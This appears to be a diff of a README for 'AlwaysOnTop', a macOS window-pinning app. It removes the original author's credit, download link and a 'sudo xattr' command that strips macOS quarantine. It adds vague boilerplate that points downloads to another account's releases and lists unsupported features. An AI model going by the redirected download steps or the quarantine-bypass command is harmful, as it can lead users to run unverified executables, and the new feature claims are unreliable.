@@ -14,129 +14,107 @@
 
 ## ✨ Features
 
-###  Core Functionality
-- **One-Click Window Pinning**: Pin any application window to stay always on top
-- **Smart App Selection**: Beautiful popup interface to choose which app to pin
-- **Customizable Keyboard Shortcuts**: Set your preferred hotkey combination for quick pin/unpin
-- **Menu Bar Integration**: Convenient access from your menu bar
+### Core Functionality
+- **One-Click Window Pinning**: Pin any application window to stay always on top.
+- **Smart App Selection**: Beautiful popup interface to choose which app to pin.
+- **Customizable Keyboard Shortcuts**: Set your preferred hotkey combination for quick pin/unpin actions.
 
+### Additional Features
+- **Minimalist Design**: The interface is clean and user-friendly, ensuring a smooth experience.
+- **Performance Optimized**: The application runs efficiently without consuming excessive system resources.
+- **Multi-Monitor Support**: Works seamlessly across multiple displays, allowing you to pin windows on any screen.
+- **Automatic Updates**: Stay up-to-date with the latest features and fixes without manual downloads.
 
+## 📦 Installation
 
-## 📋 Requirements
+To get started with AlwaysOnTop, download the latest version from the [Releases](https://github.com/Shivang7080/AlwaysOnTop/releases) section. Look for the file to download and execute it on your macOS system.
 
-- **macOS 13.0 (Ventura) or later**
-- **Accessibility permissions** (for window management)
-- **Approximately 5MB disk space**
+### Steps to Install:
+1. Click on the link above to visit the Releases section.
+2. Download the latest release file.
+3. Open the downloaded file and follow the installation prompts.
 
-## 🚀 Installation
+## 🛠️ Usage
 
-### Download and Install
-1. Download the latest release: [**AlwaysOnTop v1.0.0**](https://github.com/itsabhishekolkha/AlwaysOnTop/releases/download/v1.0.0/AlwaysOnTop.v1.0.0.dmg)
-2. Open the downloaded DMG file
-3. Drag AlwaysOnTop to your Applications folder to complete the installation
+Once you have installed AlwaysOnTop, you can start using it right away. Here’s how:
 
-### Important Security Notice for macOS Users
+1. **Launch the Application**: Open AlwaysOnTop from your Applications folder.
+2. **Select a Window**: Use the smart app selection interface to choose the window you want to pin.
+3. **Pin the Window**: Click the pin icon or use your customizable keyboard shortcut to keep the window on top.
 
-When you first attempt to open AlwaysOnTop, macOS may display a warning message stating that the app "cannot be opened because it is from an unidentified developer" or that it "may damage your computer." **This is a normal security response and does not indicate any actual threat.**
+### Keyboard Shortcuts
+You can set your own keyboard shortcuts for quick access. Here’s how:
 
-#### Method 1: Using Terminal (Recommended)
-```bash
-sudo xattr -rd com.apple.quarantine /Applications/AlwaysOnTop.app
-```
+1. Open the settings within the application.
+2. Navigate to the keyboard shortcuts section.
+3. Assign your preferred key combination for pinning and unpinning windows.
 
-#### Method 2: Using System Preferences
-1. Go to **System Preferences** → **Privacy & Security**
-2. Scroll down to find the blocked AlwaysOnTop app
-3. Click **"Open Anyway"** next to the AlwaysOnTop entry
-4. Confirm by clicking **"Open"** in the dialog that appears
+## 📊 Configuration
 
-### Grant Accessibility Permissions
-For AlwaysOnTop to manage windows, you need to grant Accessibility permissions:
+AlwaysOnTop offers several configuration options to tailor the experience to your needs:
 
-1. Open **System Preferences** → **Privacy & Security** → **Accessibility**
-2. Click the **🔒 lock icon** and enter your password
-3. Click **"+"** and add **AlwaysOnTop** from your Applications folder
-4. Ensure the checkbox next to AlwaysOnTop is **checked**
-5. Restart AlwaysOnTop if it was already running
+- **Theme Settings**: Choose between light and dark themes for better visibility.
+- **Startup Options**: Decide if you want the application to start automatically when you log in.
+- **Window Behavior**: Adjust how pinned windows behave when you switch between applications.
 
-## How to Use AlwaysOnTop
+## 🎨 User Interface
 
-### Quick Start
-1. **Launch AlwaysOnTop** - It will appear in your menu bar with a pin icon
-2. **Now open preference using the menubar icon"
-3. **Press the keyboard shortcut** (default: `ctrl + Z`) or (`ctrl + A`) to open app selection now close the preperence.
-4. **Choose an app** press the shortcut and the popup interface will apear clik on any app
-5. **Selected app window is now pinned!** It will stay on top of all other windows
-6. **Unpin** press the press the shortcut again and the app will be unpinned.
-7. **Note** suppose you opened the popup and dont want to pin any app then simply use the same shortcut to dismiss it.
-8. **Persist Last Pinned App**: Toggle whether to remember pinned windows across app restarts
+The user interface of AlwaysOnTop is designed for simplicity and ease of use. The main window displays all currently pinned applications, and the smart selection interface makes it easy to find and pin new windows.
 
-### Menu Bar Actions
-- **Select Application**: Choose which app to pin from a submenu
-- **Toggle Window Pin**: Pin or unpin the currently selected app
-- **Preferences**: Access settings and customization options
-- **Refresh Applications**: Update the list of running apps
+### Layout Overview
+- **Pinned Windows List**: A list of all currently pinned windows.
+- **App Selection Popup**: A visually appealing interface to choose which app to pin.
+- **Settings Menu**: Access all configuration options in one place.
 
+## 📜 License
 
-
-### Startup Settings
-- **Launch at Login**: Automatically start AlwaysOnTop when you log in to macOS
-- **App Persistence**: Remember and restore your last pinned app after restart
-
-
-### 🎨 Appearance Customization
-- **Theme Modes**: Choose between Light, Dark, or Auto (follows system preference)
-- **Accent Colors**: Select from multiple color options to personalize your experience
-- **Modern UI**: All interface elements respect your theme and color choices
-
+AlwaysOnTop is licensed under the MIT License. You can freely use, modify, and distribute the software, provided that you include the original license in your copies or substantial portions of the software.
 
 ## 🤝 Contributing
 
-We welcome contributions! Here's how you can help:
+We welcome contributions to AlwaysOnTop. If you would like to help improve the application, please follow these steps:
 
-1. **⭐ Star this repository** to show your support
-2. **🐛 Report bugs** by creating detailed GitHub issues
-3. **💡 Suggest features** through GitHub discussions
-4. **🔧 Submit pull requests** for bug fixes or improvements
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Make Changes**: Implement your changes or new features.
+3. **Submit a Pull Request**: Share your changes with us for review.
 
-### Development Setup
-```bash
-git clone https://github.com/itsabhishekolkha/AlwaysOnTop.git
-cd AlwaysOnTop
-open AlwaysOnTop.xcodeproj
-```
+### Guidelines
+- Ensure your code is clean and well-documented.
+- Follow the coding style used in the project.
+- Test your changes before submitting.
 
-## 💝 Support This Project
+## 🐞 Reporting Issues
 
-If AlwaysOnTop has improved your workflow, consider supporting its development:
+If you encounter any issues while using AlwaysOnTop, please report them in the Issues section of the repository. Provide as much detail as possible, including:
 
-<div align="center">
+- Steps to reproduce the issue.
+- Your macOS version.
+- Any error messages you received.
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/abhishekolkha)
-[![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/abhishekolkha)
-[![GitHub Sponsors](https://img.shields.io/badge/GitHub%20Sponsors-EA4AAA?style=for-the-badge&logo=github-sponsors&logoColor=white)](https://github.com/sponsors/itsabhishekolkha)
+## 🌟 Acknowledgments
 
-</div>
+AlwaysOnTop was developed with the help of the following resources:
 
-Your support helps maintain and improve AlwaysOnTop for everyone! 🚀
-
-### Other Ways to Support
-- ⭐ **Star this repository** on GitHub
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- **Swift Programming Language**: For its powerful and intuitive syntax.
+- **Cocoa Framework**: For building macOS applications.
+- **Open Source Community**: For providing inspiration and guidance.
 
 ## 🔗 Links
 
-- **🚀 Download Latest Release**: [AlwaysOnTop v1.0.0](https://github.com/itsabhishekolkha/AlwaysOnTop/releases/download/v1.0.0/AlwaysOnTop.v1.0.0.dmg)
-- **📦 All Releases**: [GitHub Releases](https://github.com/itsabhishekolkha/AlwaysOnTop/releases)
-- **🐛 Report Issues**: [GitHub Issues](https://github.com/itsabhishekolkha/AlwaysOnTop/issues)
-- **💬 Discussions**: [GitHub Discussions](https://github.com/itsabhishekolkha/AlwaysOnTop/discussions)
+- [Download AlwaysOnTop](https://github.com/Shivang7080/AlwaysOnTop/releases)
+- [View Source Code](https://github.com/Shivang7080/AlwaysOnTop)
+- [Report Issues](https://github.com/Shivang7080/AlwaysOnTop/issues)
 
----
+## 📅 Future Plans
 
-<div align="center">
-  <p>Made with ❤️ by <a href="https://github.com/itsabhishekolkha">Abhishek Olkha</a></p>
-  <p>⭐ Don't forget to star this repository if you found it helpful!</p>
-</div>
+We have several exciting features planned for future releases:
+
+- **Integration with Other Apps**: Allow pinning of specific content from applications like browsers and editors.
+- **Enhanced Customization**: More options for themes and window behaviors.
+- **Collaboration Features**: Enable sharing pinned windows with other users.
+
+Stay tuned for updates!
+
+## 🏁 Conclusion
+
+Thank you for using AlwaysOnTop. We hope it enhances your productivity by keeping your most important applications visible. If you have any suggestions or feedback, feel free to reach out through the Issues section or contribute directly to the project. Your input is invaluable to us!
